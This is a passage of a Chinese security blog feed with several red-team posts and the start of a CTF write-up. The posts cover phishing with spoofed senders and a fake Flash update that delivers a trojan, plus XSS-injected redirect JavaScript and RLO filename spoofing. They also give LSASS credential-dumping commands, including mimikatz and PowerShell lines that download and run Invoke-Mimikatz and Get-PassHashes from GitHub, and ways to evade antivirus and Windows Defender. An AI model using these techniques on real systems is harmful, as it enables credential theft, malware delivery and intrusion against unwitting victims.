src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1831402730.png"></p><p>导入收件人，这里邮件和名字一定要用tab键分开，再导入模板的文件的时候，去选择一封你需要伪造的正常文件，然后点击选择显示文件原文，复制粘贴就行，achment就是附件，可以加入你的免杀马，word，什么的，embed项就是点击之后要跳转的页面，那么可以配合clone web使用，填入我们cs服务器克隆的网站url，然后就是设置邮件服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3448051565.png"></p><p>Bounce to 选项就是你伪造好的邮箱，你可以伪造成<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;</a>什么的，但是大多数邮件服务器有防御，会显示代发人，发之前还可以点击Preview进行预览<br>再来给flash钓鱼网站，当我们找到一个网站的后台，顺利进去了，但是任何getshell的点，就只找到一个xss，那么如何getshell嘞？这时候就来一波flash钓鱼把<br>建立网站</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4240948205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2819329814.png"></p><p>我们找到index.html中的立即下载所在的标签，url替换成我们的木马下载链接</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/358161573.png"></p><p>那么我们如何让管理员重定向过来？这里新建一个js文件，文件内容如下，然后我们的xss脚本调用这段js文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">window.alert &#x3D; function(name) &#123;</span><br><span class="line">   var iframe &#x3D; document.createElement(&quot;IFRAME&quot;);</span><br><span class="line">   iframe.style.display&#x3D;&quot;none&quot;;</span><br><span class="line">   iframe.setAttribute(&quot;src&quot;,&#39;data:text&#x2F;plain,&#39;);</span><br><span class="line">   document.documentElement.appendChild(iframe);</span><br><span class="line">   window.frames[0].window.alert(name);</span><br><span class="line">   iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;您的flash版本过低，尝试升级后访问该页面！&quot;);</span><br><span class="line">window.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.xxx.com&quot;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.abc.flash.com.cn&#x2F;redirection.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>当然为了保险起见，我们得配合自解压钓鱼，现在压缩的是两个文件，一个是木马文件，另一个是flash正常安装程序，两个文件都得执行，通过修改资源图标，伪装成flash安装程序，<br>就可以getshell了！</p><h2 id="8-unicode反转文件后缀钓鱼"><a href="#8-unicode反转文件后缀钓鱼" class="headerlink" title="8.unicode反转文件后缀钓鱼"></a>8.unicode反转文件后缀钓鱼</h2><p>Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。而如上技术正是使用了Unicode的RLO（开始从左向右覆盖），Unicode定义的 Start of right-to-left override，控制字符是RLO，ASCII码是0x3F。只要在一行字符前面加上一个0x3F就可以实现文本的反向排列。这个0x3F是Unicode为了兼容阿拉伯文字从左至右的阅读习惯设计的一个转义字符。<br>选择木马，重命名，然后点击插入unicode控制字符</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2866579500.png"></p><p>完成之后</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/464682027.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队技巧-导出凭据和密码</title>
      <link href="2021/02/17/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE%E5%92%8C%E5%AF%86%E7%A0%81/"/>
      <url>2021/02/17/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE%E5%92%8C%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>红队中各种抓取密码凭据的方法，文末彩蛋，内附工具链接，以及我制作的过360的minikatz的版本，各位请享用，最近筹备重新开blog，记录学习计划，不然知识我学完立马就忘了，与大家一起学习！</p><h2 id="1-Procdump转储Lsass-exe的内存"><a href="#1-Procdump转储Lsass-exe的内存" class="headerlink" title="1.Procdump转储Lsass.exe的内存"></a>1.Procdump转储Lsass.exe的内存</h2><p>前提：需要管理员及以上权限<br>常用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump  -accepteula -ma lsass.exe lsass_dump</span><br></pre></td></tr></table></figure><p>导出的.dmp文件本地配合minikatz 取出密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::Minidump lsassdump.dmp</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure><p>如果对lsass.exe敏感的话，那么还可以配合lsass.exe的pid来使用更香：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump -accepteula -ma pid lsass.dmp</span><br></pre></td></tr></table></figure><h2 id="2-wce导出hash"><a href="#2-wce导出hash" class="headerlink" title="2.wce导出hash"></a>2.wce导出hash</h2><p>前提：需要管理员及以上权限，版本限制（仅支持Windows XP，2003，Vista，7、2008和Windows 8）<br>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wce.exe -o file.txt</span><br><span class="line">wec.exe</span><br></pre></td></tr></table></figure><h2 id="3-comsvcs-dll转储LSASS-exe内存"><a href="#3-comsvcs-dll转储LSASS-exe内存" class="headerlink" title="3.comsvcs.dll转储LSASS.exe内存"></a>3.comsvcs.dll转储LSASS.exe内存</h2><p>前提：在powershell中运行，管理员权限以上<br>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full</span><br></pre></td></tr></table></figure><p>清理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-Item $env:TEMP\lsass.dmp -ErrorAction Ignore</span><br></pre></td></tr></table></figure><h2 id="4-使用系统调用和拜托hook的api转储LSASS-exe内存"><a href="#4-使用系统调用和拜托hook的api转储LSASS-exe内存" class="headerlink" title="4.使用系统调用和拜托hook的api转储LSASS.exe内存"></a>4.使用系统调用和拜托hook的api转储LSASS.exe内存</h2><p>详情请查看这篇文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;outflank.nl&#x2F;blog&#x2F;2019&#x2F;06&#x2F;19&#x2F;red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr&#x2F;</span><br></pre></td></tr></table></figure><p>这是一篇非常nice的文章，值得一看，打开一个新世界的大门！<br>有关github项目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;outflanknl&#x2F;Dumpert</span><br></pre></td></tr></table></figure><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dumpert_exe</span><br><span class="line">或者</span><br><span class="line">rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump</span><br></pre></td></tr></table></figure><p>运行效果截图：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1854110683.png"></p><h2 id="5-Windows-Task-Manager转储LSASS-exe内存"><a href="#5-Windows-Task-Manager转储LSASS-exe内存" class="headerlink" title="5.Windows Task Manager转储LSASS.exe内存"></a>5.Windows Task Manager转储LSASS.exe内存</h2><p>直接打开任务管理器，找到lsass.exe进程，右键选中右键</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1827568870.png"></p><h2 id="6-Mimikatz"><a href="#6-Mimikatz" class="headerlink" title="6.Mimikatz"></a>6.Mimikatz</h2><p>前提：管理员权限以及以上，建议自己编译源码去掉一些特征字符，一些不必要的语句<br>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_exe &quot;sekurlsa::minidump lsass.dump&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>powershell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#读取明文密码</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;mattifestation&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz –DumpCerts</span><br><span class="line">#读取hash</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes</span><br></pre></td></tr></table></figure><p>猕猴桃杀软重点看照对象之一。</p><h2 id="7-pypykatz读取LSASS"><a href="#7-pypykatz读取LSASS" class="headerlink" title="7.pypykatz读取LSASS"></a>7.pypykatz读取LSASS</h2><p>前提：必须安装python3，管理员权限以及以上<br>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">pip install pypykatz</span><br><span class="line">#使用</span><br><span class="line">pypykatz live lsa</span><br></pre></td></tr></table></figure><p>抓得不只是lsass，还有其他的。<br>运行效果：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2555028571.png"></p><p>杀软拦截概率很低</p><h2 id="8-Out-Minidump-ps1转储LSASS-exe内存"><a href="#8-Out-Minidump-ps1转储LSASS-exe内存" class="headerlink" title="8.Out-Minidump.ps1转储LSASS.exe内存"></a>8.Out-Minidump.ps1转储LSASS.exe内存</h2><p>前提：powershell，管理员权限以及以上<br>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell “IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;mattifestation&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Out-Minidump.ps1&#39;); get-process lsass | Out-Minidump”</span><br></pre></td></tr></table></figure><p>清除文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore</span><br></pre></td></tr></table></figure><p>杀软会拦截。</p><h1 id="彩蛋福利"><a href="#彩蛋福利" class="headerlink" title="彩蛋福利"></a>彩蛋福利</h1><p>直接去下载github上面的release版本百分之百被杀的，我这把源码拉下来，自己编译，去除一些特征。<br>请看：过360的minikatz截图：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3397367405.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2620290165.png"></p><p>不知道是不是我刚更新没有关网络，把我64位的搞死了，但是32位的依然坚挺！然后接着保险起见，加壳<br>工具包里面有我编译好的一些工具，懂得都懂嗷，不会的百度。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/178237449.png"></p><blockquote><p>关注公众号Gamma实验室回复：minikatz，即可获得百度云下载链接，重申一遍，本公众号分享的工具，技术只供学习研究，切勿拿去违法犯罪，违法犯罪与公众号与作者无关。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powerview脚本和Windowsdefender的恩恩怨怨</title>
      <link href="2021/02/15/Powerview%E8%84%9A%E6%9C%AC%E5%92%8CWindowsdefender%E7%9A%84%E6%81%A9%E6%81%A9%E6%80%A8%E6%80%A8/"/>
      <url>2021/02/15/Powerview%E8%84%9A%E6%9C%AC%E5%92%8CWindowsdefender%E7%9A%84%E6%81%A9%E6%81%A9%E6%80%A8%E6%80%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>起因，是我想测试一下，powersploit的免杀效果，然后就去github下载了powersploit的脚本集合包，powerview脚本也给集合进去了，然后就引发了一些列感到令人疑惑的事。</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h1><p>当我导入recon信息收集模块的时候，windows defender 报毒了，给我阻止了</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4219648887.png"></p><p>按照以往的查找特征码手法，是挨个文件试，结果被我发现是powerview.ps1这个脚本被windows defender报毒，范围进一步缩小。<br>然后就开始免杀windows defender的尝试，我开始把一些脚本里的特征字符，多余的字符，比如什么介绍，注释什么的都删掉，删掉了一部分<br>再次尝试导入：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/31578860.png"></p><p>依然失败，我把windows defender 来直接扫描文件，没有报毒，说明静态过了的，那肯定是动态行为没过。<br>powershell 脚本过amsi挺多方法的，比如字符拼接，编码，变量替换等等，但是powerview很长一段的代码，我得逐行去试，去找特征字符串，那真的难受死了。<br>因为我本人也不是很懂powershell，所以没去尝试，然后想到一个过windows defender的办法，感觉挺简单的<br>那就是用其他杀毒软件去接管windows的杀毒功能，这样windows defender就只能歇息了，因为某些原因，国内的杀毒软件没有一个会调用微软提供的amsi这个接口，所以国内的杀毒相对于来说，更好过。<br>然后我就安装个火绒（没有针对火绒，只是第一个想到它而已），然后再次导入，没有拦截</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/757619212.png"></p><p>果然还是得用杀软对抗杀软！简直tql<br>然后我想着，这上来就给人家安装个杀软，动静多大啊！我有那么好心？<br>然后我继续删删减减，然后我直接跳到最后，加换行符。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/683658821.png"></p><p>加了一些，然后继续，依然被拦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/649581227.png"></p><p>但是不会文件不会被kaii掉，是一种进步，一次偶然得操作，我把powerview脚本移到Desktop目录下，也就是桌面</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2537508016.png"></p><p>居然成功了？卧槽！！！！！！<br>然后我又被脚本移到其他位置，继续杀，我就很疑惑。<br>通过对比原先的文件，我发现我只是加了几个换行，然后我放到了不同的目录下，放在桌面居然不杀</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3829236803.png"></p><p>最后我听到冷意老哥说过，windows defender 好像会不杀一些目录…………………………………….</p><h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p>那么各位，那些目录不会被杀嘞？实际以测试环境为准，我自己的是windows 家庭版，没装任何杀毒</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Powerview </tag>
            
            <tag> Windowsdefender </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021 WEEK2</title>
      <link href="2021/02/14/2021HGAMEWEEK2/"/>
      <url>2021/02/14/2021HGAMEWEEK2/</url>
      
        <content type="html"><![CDATA[<h1 id="0X1Misc"><a href="#0X1Misc" class="headerlink" title="0X1Misc"></a>0X1Misc</h1><h2 id="1-Tools"><a href="#1-Tools" class="headerlink" title="1.Tools"></a>1.Tools</h2><blockquote><p>工欲善其事，必先利其器。</p><p><a href="https://pan.baidu.com/s/14_A8L9q7F0t4_UzWWwowpQ"><strong>附件</strong></a>（提取码：glal）</p></blockquote><p>很明显看附件名就知道是F5隐写<br>首先我们查看属性得知其密码：<code>!LyJJ9bi&amp;M7E72*JyD</code>，进而得到压缩包密码: <code>e@317S*p1A4bIYIs1M</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3776381756.png"></p><p>又是一层加密…<br>同样的处理方法，就是这次是steghide隐写，得到压缩包密码：<code>u0!FO4JUhl5!L55%$&amp;</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1978650805.png"></p><p>好家伙！经典老套娃了<br>这回是Outguess隐写，同样的手法得到压缩包密码：<code>@UjXL93044V5zl2ZKI</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4083506960.png"></p><p>终于到最后一层加密了，JPHS隐写得到压缩包密码：<code>xSRejK1^Z1Cp9M!z@H</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/215998599.png"></p><p>最终将四块拼接起来组成一个完整的二维码，扫码得到flag：hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/939044409.png"></p><h2 id="2-Telegraph：1601-6639-3459-3134-0892"><a href="#2-Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="2.Telegraph：1601 6639 3459 3134 0892"></a>2.Telegraph：1601 6639 3459 3134 0892</h2><blockquote><p>他曾经最喜欢的曲师写的曲子，让人犹如漫步在星空之下，可如今他听见只觉得反胃。由于文件名过长，单独给出附件的md5: E5C3EE3F441B860B07A3ADCD98BFFC00<br>请将flag以hgame{your_flag_here}形式提交，flag为全大写。</p><p><a href="https://pan.baidu.com/s/1RiMUwlUa07rtGHT9PxdKDQ"><strong>附件</strong></a>（提取码：e397）</p></blockquote><p>播放很明显有段掺杂着摩斯电码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3904669029.png"></p><p>整理得到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</span><br></pre></td></tr></table></figure><p>Morse解得flag：hgame{4G00DS0NGBUTN0T4G00DMAN039310KI}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yourflagis:4g00ds0ngbutn0t4g00dman039310ki</span><br></pre></td></tr></table></figure><h2 id="3-Hallucigenia"><a href="#3-Hallucigenia" class="headerlink" title="3.Hallucigenia"></a>3.Hallucigenia</h2><blockquote><p>“我们不仅弄错了他的上下，还颠倒了它的左右。”</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/814317860.png"></p></blockquote><p>lsb发现二维码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4009259933.png"></p><p>扫码得到字符串（bushi  如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC&#x2F;KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51&#x2F;KHHT&#x2F;6&#x2F;ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5&#x2F;IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF&#x2F;LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y&#x2F;&#x2F;&#x2F;p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk&#x3D;</span><br></pre></td></tr></table></figure><p>跑下脚本发现它并非字符串而应该是个png的二进制文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3635629162.png"></p><p><strong>附上脚本：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from base64 import b64decode </span><br><span class="line"></span><br><span class="line">open(&#39;flag&#39;, &#39;wb+&#39;).write(b64decode(open(&#39;flag.txt&#39;, &#39;rb&#39;).read()))</span><br></pre></td></tr></table></figure><p>于是乎利用脚本将其反转得到png图片  </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/47297967.png"></p><p><strong>附上脚本：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from base64 import b64decode </span><br><span class="line"></span><br><span class="line">open(&#39;flag.png&#39;, &#39;wb+&#39;).write(b64decode(open(&#39;flag.txt&#39;, &#39;rb&#39;).read()) [::-1])</span><br></pre></td></tr></table></figure><p>定睛一看反过来就是flag：hgame{tenchi_souzou_dezain_bu}</p><h2 id="4-DNS"><a href="#4-DNS" class="headerlink" title="4.DNS"></a>4.DNS</h2><blockquote><p>A significant invention.</p><p><a href="https://pan.baidu.com/s/1v2nj2b1OU37p6vy1e791Zw"><strong>附件</strong></a>（提取码：6af6）</p></blockquote><p>在DNS下发现一个域名 <code>flag.hgame2021.cf</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3826579680.png"></p><p>对其进行访问，查看源码发现关键信息：SPF</p><blockquote><p>何为SPF？（百度一下我就知道<br><a href="https://www.altn.com.cn/5728.html">https://www.altn.com.cn/5728.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4278093788.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/308378175.png"></p><p>最后<a href="https://uutool.cn/nslookup/">nslookup查询其TXT记录</a>得到flag：hgame{D0main_N4me_5ystem}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2004921368.png"></p><p>Windows-cmd查询命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set q&#x3D;txt</span><br><span class="line">flag.hgame2021.cf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/952190089.png"></p><p>Linux-kali查询命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由于我用的是kali2020，我需要先切换到root权限再执行以下命令</span><br><span class="line">dig -t txt flag.hgame2021.cf</span><br></pre></td></tr></table></figure><h1 id="0X2Web"><a href="#0X2Web" class="headerlink" title="0X2Web"></a>0X2Web</h1><h2 id="1-LazyDogR4U"><a href="#1-LazyDogR4U" class="headerlink" title="1.LazyDogR4U"></a>1.LazyDogR4U</h2><blockquote><p>懒狗R4u把Flag藏起来了，但由于他是懒狗，所以flag藏的很不安全。<br>Challenge Address<br><a href="http://ecdaa2e20e.lazy.r4u.top/">http://ecdaa2e20e.lazy.r4u.top</a></p></blockquote><p><a href="http://www.zip下载源码/">www.zip下载源码</a><br>审计flag.php：引入了lazy.php 并且 发现满足 <code>$_SESSION[&#39;username&#39;] === &#39;admin&#39;</code> 即可获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">require_once &#39;lazy.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&#39;username&#39;]))&#123;</span><br><span class="line">    die(&#39;您配吗？&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;static&#x2F;style.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form class&#x3D;&quot;box&quot; action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    if($_SESSION[&#39;username&#39;] &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">        echo &quot;&lt;h3 style&#x3D;&#39;color: white&#39;&gt;admin将于今日获取自己忠实的flag&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;h3 style&#x3D;&#39;color: white&#39;&gt;$flag&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if($submit &#x3D;&#x3D; &quot;getflag&quot;)&#123;</span><br><span class="line">            echo &quot;&lt;h3 style&#x3D;&#39;color: white&#39;&gt;&#123;$_SESSION[&#39;username&#39;]&#125;接近了问题的终点&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;h3 style&#x3D;&#39;color: white&#39;&gt;篡位者占领了神圣的页面&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;getflag&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>接着，审计lazy.php：发现可将 <code>_GET</code> 、 <code>_POST</code> 传⼊的变量全部注册为普通变量造成变量覆盖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filter &#x3D; [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, 